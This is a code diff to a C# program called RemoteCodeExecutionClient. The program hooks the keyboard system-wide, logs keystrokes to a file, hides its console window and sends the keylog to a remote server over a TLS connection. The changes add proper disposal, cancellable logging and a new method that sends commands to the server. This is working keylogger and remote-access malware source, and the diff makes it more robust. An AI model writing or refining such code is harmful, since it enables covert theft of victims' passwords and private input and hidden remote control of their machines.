@@ -41,7 +41,7 @@ namespace RemoteCodeExecutionClient
 
         public static async Task ClientMain()
         {
-            var keyboardLogger = new KeyboardLogger();
+            using var keyboardLogger = new KeyboardLogger();
             keyboardLogger.Start();
 
             var handle = GetConsoleWindow();
@@ -81,7 +81,7 @@ namespace RemoteCodeExecutionClient
                                 }
                             }
 
-                            await Task.WhenAll(heartbeatTask, keylogTask);
+                            await Task.WhenAny(heartbeatTask, keylogTask);
                         }
                     }
                 }
@@ -141,7 +141,7 @@ namespace RemoteCodeExecutionClient
         }
     }
 
-    class ConnectionManager
+    class ConnectionManager : IDisposable
     {
         private readonly TcpClient _client;
         private readonly SslStream _sslStream;
@@ -269,10 +269,22 @@ namespace RemoteCodeExecutionClient
             await SendTypedDataAsync(MessageType.Keylog, data);
         }
 
+        public async Task SendCommandAsync(string command)
+        {
+            var data = Encoding.UTF8.GetBytes(command);
+            await SendTypedDataAsync(MessageType.Command, data);
+        }
+
         public void Close()
         {
             _sslStream.Close();
             _client.Close();
+        }
+
+        public void Dispose()
+        {
+            _sslStream.Dispose();
+            _client.Dispose();
         }
     }
 
@@ -426,7 +438,7 @@ namespace RemoteCodeExecutionClient
         // Add more as needed
     }
 
-    class KeyboardLogger
+    class KeyboardLogger : IDisposable
     {
         [DllImport("user32.dll")]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -451,6 +463,9 @@ namespace RemoteCodeExecutionClient
         private static IntPtr _hookID = IntPtr.Zero;
         private static readonly string KeylogFile = "keylog.txt";
 
+        private CancellationTokenSource? _cts;
+        private Task? _logTask;
+
         public KeyboardLogger()
         {
             _instance = this;
@@ -459,7 +474,8 @@ namespace RemoteCodeExecutionClient
         public void Start()
         {
             _hookID = SetHook(_proc);
-            Task.Run(LogKeysToFile);
+            _cts = new CancellationTokenSource();
+            _logTask = Task.Run(() => LogKeysToFile(_cts.Token));
         }
 
         public void Stop()
@@ -469,6 +485,14 @@ namespace RemoteCodeExecutionClient
                 UnhookWindowsHookEx(_hookID);
                 _hookID = IntPtr.Zero;
             }
+            _cts?.Cancel();
+            _logTask?.Wait();
+        }
+
+        public void Dispose()
+        {
+            Stop();
+            _cts?.Dispose();
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -495,11 +519,11 @@ namespace RemoteCodeExecutionClient
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
-        private async Task LogKeysToFile()
+        private async Task LogKeysToFile(CancellationToken token)
         {
-            while (true)
+            while (!token.IsCancellationRequested)
             {
-                await Task.Delay(60000);
+                await Task.Delay(60000, token).ContinueWith(_ => { });
                 try
                 {
                     var keysByMinute = new System.Collections.Generic.Dictionary<DateTime, System.Collections.Generic.List<SimpleKeys>>();
